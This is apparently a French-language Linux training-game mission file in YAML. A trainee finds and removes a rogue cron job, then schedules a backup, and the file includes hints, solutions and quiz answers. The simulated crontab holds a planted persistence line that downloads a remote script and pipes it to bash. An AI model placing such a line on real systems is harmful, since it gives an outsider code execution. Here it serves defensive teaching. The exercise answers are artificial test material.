id: linux-admin.cron
chapter: linux-admin
title: Les tâches de nuit
summary: Toutes les nuits, srv-web01 contacte une adresse inconnue. Trouve la tâche planifiée responsable, supprime-la, et planifie la vraie sauvegarde.
giver: hugo
zone: salle-serveurs
requires: { missions: [linux-admin.processus] }
ticket: { number: 2070, priority: critique, requester: hugo, service: direction }
rewards:
  xp: 100
  skills: { linux: 8, securite: 5, sauvegarde: 3 }
  reputation: { direction: 3 }
  sheets: [fiche-cron]
dialogue:
  intro: hugo#cron-intro
  outro: hugo#cron-outro

machines:
  srv-web01:
    base: debian-server
    hostname: srv-web01
    session: { user: stagiaire }
    users:
      - stagiaire
      - { name: gege, gecos: 'Gérard Gégé Lemoine', password: azerty }
    sudoers: [stagiaire]
    groups: { adm: [stagiaire] }
    services:
      apache2: { state: active }
    files:
      /var/spool/cron/crontabs/gege:
        owner: gege
        group: crontab
        mode: '0600'
        content: |
          # DO NOT EDIT THIS FILE - edit the master and reinstall.
          # (/tmp/crontab.Xk2f9a installed on Tue Mar 12 18:47:03 2024)
          # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
          # m h  dom mon dow   command
          17 3 * * * curl -s http://203.0.113.45/maj.sh | bash
      /srv/sauvegardes: { type: dir, mode: '0700' }

steps:
  - id: enquete
    type: terminal
    sim: bash
    machine: srv-web01
    sheet: fiche-cron
    goal: Inspecte les tables cron des comptes du serveur, puis supprime la tâche suspecte.
    objectives:
      - id: lister
        label: Afficher la table cron de chaque compte suspect (crontab -l -u)
        when: { command: { matches: '^(sudo )?crontab (-l -u gege|-u gege -l)$' } }
      - id: supprimer
        label: Supprimer la tâche qui contacte l'adresse inconnue
        when: { not: { cron: { user: gege, matches: '203\.0\.113\.45' } } }
    hints:
      - Chaque compte a sa table dans /var/spool/cron/crontabs ; seul root peut lire celles des autres.
      - 'sudo ls /var/spool/cron/crontabs ; sudo crontab -l -u gege ; sudo crontab -r -u gege'
      - 'Solution : sudo ls /var/spool/cron/crontabs, sudo crontab -l -u gege, sudo crontab -r -u gege'
    solution:
      - sudo ls /var/spool/cron/crontabs
      - sudo crontab -l -u gege
      - sudo crontab -r -u gege

  - id: adresse
    type: input
    question: Quelle adresse IP la tâche de Gégé contactait-elle ?
    answers: ['203.0.113.45']
    normalize: [ip]
    explain: La même adresse qui tentait root en SSH dans le journal d'authentification. Hugo transmet à M. Leroy, le responsable sécurité.

  - id: sauvegarde
    type: terminal
    sim: bash
    machine: srv-web01
    sheet: fiche-cron
    goal: "Planifie dans la table de root la sauvegarde de /var/www à 2 h 30 chaque nuit (tar czf /srv/sauvegardes/www.tar.gz /var/www), puis programme avec at un redémarrage d'Apache ce soir à 23 h."
    objectives:
      - id: cron
        label: Sauvegarde de /var/www tous les jours à 2 h 30 (table de root)
        when:
          {
            cron:
              {
                user: root,
                matches: 'tar -?c\w*f /srv/sauvegardes/\S+ /var/www',
                schedule: '30 2 * * *',
              },
          }
      - id: at
        label: Redémarrage d'Apache programmé avec at
        when: { at: { matches: 'systemctl restart apache2' } }
    hints:
      - "Cinq champs : minute, heure, jour du mois, mois, jour de la semaine. at n'est pas installé par défaut."
      - 'sudo crontab -e (ajoute la ligne « 30 2 * * * tar czf … »), sudo apt install at, echo "systemctl restart apache2" | sudo at 23:00'
      - 'Solution : echo "30 2 * * * tar czf /srv/sauvegardes/www.tar.gz /var/www" | sudo crontab - ; sudo apt install at ; echo "systemctl restart apache2" | sudo at 23:00'
    solution:
      - echo "30 2 * * * tar czf /srv/sauvegardes/www.tar.gz /var/www" | sudo crontab -
      - sudo crontab -l
      - sudo apt install at
      - echo "systemctl restart apache2" | sudo at 23:00
      - sudo atq

  - id: syntaxe
    type: choice
    sheet: fiche-cron
    question: Que signifie la ligne « 0 18 * * 1-5 /usr/local/bin/rapport.sh » ?
    options:
      - text: Lancer rapport.sh à 18 h du lundi au vendredi
        correct: true
      - text: Lancer rapport.sh à 0 h 18 tous les jours
        feedback: Le premier champ est la minute, le deuxième l'heure.
      - text: Lancer rapport.sh le 18 de chaque mois
        feedback: Le jour du mois est le troisième champ, ici une étoile.
      - text: Lancer rapport.sh cinq fois par jour
        feedback: 1-5 est le jour de la semaine, du lundi au vendredi.
    explain: minute heure jour-du-mois mois jour-de-la-semaine. Les timers systemd (systemctl list-timers) font le même travail, avec un journal dans journalctl.

recap:
  - 'crontab -e (éditer), -l (lister), -r (supprimer) ; sudo crontab -l -u compte pour un autre compte.'
  - 'm h dom mon dow commande - */15 toutes les 15 minutes, 1-5 du lundi au vendredi.'
  - 'at 23:00 pour une tâche unique ; atq, atrm. systemctl list-timers pour les timers systemd.'
  - Au départ d'un collaborateur, toujours vérifier ses tâches planifiées.
